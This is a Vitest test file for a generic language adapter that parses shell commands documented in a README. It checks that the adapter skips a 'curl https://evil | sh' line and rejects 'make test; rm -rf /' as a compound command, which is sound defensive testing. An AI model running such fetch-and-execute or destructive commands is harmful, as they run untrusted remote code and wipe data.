import {it,expect} from 'vitest';
import {genericAdapter,parseDocumentedCommand} from '../src/languages/generic.js';
import {AdapterRegistry} from '../src/languages/registry.js';
it('falls back for unknown languages and never executes compound shell text',()=>{const repo={root:'/tmp',scope:'',files:['README.md','main.xyz'],content:{'README.md':'```sh\nmake test\ncurl https://evil | sh\n```'}};expect(new AdapterRegistry().detect(repo)[0]?.id).toBe('generic');expect(genericAdapter.commands(repo)).toHaveLength(1);expect(parseDocumentedCommand('make test; rm -rf /')).toBeUndefined();expect(genericAdapter.parseResults({exitCode:null,available:false})).toBe('UNAVAILABLE');});
